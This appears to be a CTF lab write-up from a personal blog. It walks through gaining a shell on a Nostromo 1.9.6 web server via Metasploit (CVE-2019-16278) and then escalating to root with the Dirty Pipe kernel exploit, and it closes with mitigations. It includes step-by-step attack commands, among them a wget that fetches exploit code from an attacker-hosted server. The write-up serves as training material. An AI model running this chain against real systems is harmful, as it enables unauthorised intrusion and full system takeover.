---
title: "Glitch: Nostromo RCE to Root via Dirty Pipe"
date: 2026-03-31 23:45:00 +0530
categories: [Hackviser, Intermediate, Linux, Privilege Escalation]
tags: [nostromo, rce, dirtypipe, kernel exploit, metasploit, linux, ctf]
platform: Hackviser
author: Shivansh Sharma
image: { path: /assets/images/posts/linux-1.webp, alt: "Nostromo Exploitation" }
---

## Overview

This lab focuses on exploiting a vulnerable Nostromo web server to gain initial access and then leveraging a Linux kernel vulnerability to escalate privileges to root.

The attack chain demonstrates how outdated services combined with vulnerable kernels can lead to full system compromise.

---

## Objective

- Perform service enumeration
- Identify vulnerable web server
- Exploit Nostromo RCE vulnerability
- Escalate privileges using a kernel exploit

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sV goldnertech.hv
```

Result:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian
80/tcp open  http    nostromo 1.9.6
```

The target is running Nostromo 1.9.6, which is known to be vulnerable.
Vulnerability Identification
Search for available exploits:

```
searchsploit nostromo
```

Result:

```
nostromo 1.9.6 - Remote Code Execution
```

Associated vulnerability:
* CVE-2019-16278 — Nostromo Directory Traversal → RCE 
Exploitation
Metasploit Exploit

```
msfconsole
search nostromo
use exploit/multi/http/nostromo_code_exec
```

Set required parameters:

```
set RHOSTS goldnertech.hv
set LHOST <your_ip>
```

Check target:

```
check
```

Run exploit:

```
exploit
```

Initial Access

```
whoami
```


```
www-data
```

We now have a low-privileged shell.
Privilege Escalation
Kernel Enumeration

```
uname -a
```


```
Linux debian 5.11.0-051100-generic
```

This kernel version is vulnerable to:
* CVE-2022-0847 (Dirty Pipe) 
Stabilizing Shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Preparing Exploit
On attacker machine:

```
nano exploit.c
```

Host the file:

```
python3 -m http.server 8000
```

On target machine:

```
cd /tmp
wget http://<attacker_ip>:8000/exploit.c
```

Compile exploit:

```
gcc exploit.c -o exploit
```

Identify SUID Binaries

```
find / -perm -4000 2>/dev/null
```

Example Output:

```
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
```

Exploiting Dirty Pipe
Run exploit with a SUID binary:

```
./exploit /usr/bin/su
```

Root Access

```
whoami
```


```
root
```

Privilege escalation successful.
Proof of Exploitation
*  Initial foothold via Nostromo RCE 
*  Shell obtained as `www-data` 
*  Kernel exploit executed successfully 
*  Root shell obtained 
Impact
*  Remote code execution via vulnerable web server 
*  Full privilege escalation using kernel exploit 
*  Complete system compromise 
Mitigation
*  Upgrade Nostromo to a secure version 
*  Apply kernel patches (Dirty Pipe fix) 
*  Restrict exposure of web services 
*  Monitor for abnormal process execution 
*  Follow least privilege principles 
Real-World Insight
Nostromo is a lightweight web server that is often overlooked during patch management. Vulnerabilities like CVE-2019-16278 allow attackers to gain immediate footholds.
Kernel-level exploits such as Dirty Pipe are especially dangerous because they bypass traditional privilege boundaries and lead directly to root access.
Key Takeaways
*  Always check service versions for public exploits 
*  RCE vulnerabilities often provide quick entry points 
*  Kernel exploits can turn low access into full control 
*  Chaining vulnerabilities is key in real-world attacks
